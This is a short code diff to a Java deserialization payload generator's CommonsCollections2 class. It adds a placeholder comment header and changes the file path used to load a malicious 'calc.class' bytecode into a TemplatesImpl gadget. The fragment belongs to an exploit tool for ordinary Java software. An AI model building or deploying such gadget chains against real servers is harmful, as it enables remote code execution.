@@ -1,5 +1,11 @@
 package org.hasret.webserigen.payloads;
-
+/**
+ * 类描述
+ *
+ * @author Double
+ * @version 1.0
+ * @since 2025/3/30
+ */
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.ConstantTransformer;
@@ -32,7 +38,7 @@ public class CommonsCollections2 {
 //        tfactory.setAccessible(true);
 //        tfactory.set(templates, new TransformerFactoryImpl());
 
-        byte[] code = Files.readAllBytes(Paths.get("D:/WebJavaSeriGen/webserigen/src/main/java/org/hasret/webserigen/payloads/evilclass/calc.class"));
+        byte[] code = Files.readAllBytes(Paths.get("src/main/java/org/hasret/webserigen/payloads/evilclass/calc.class"));
         byte[][] codes = {code};
         Field bytecodes = c.getDeclaredField("_bytecodes");
         bytecodes.setAccessible(true);
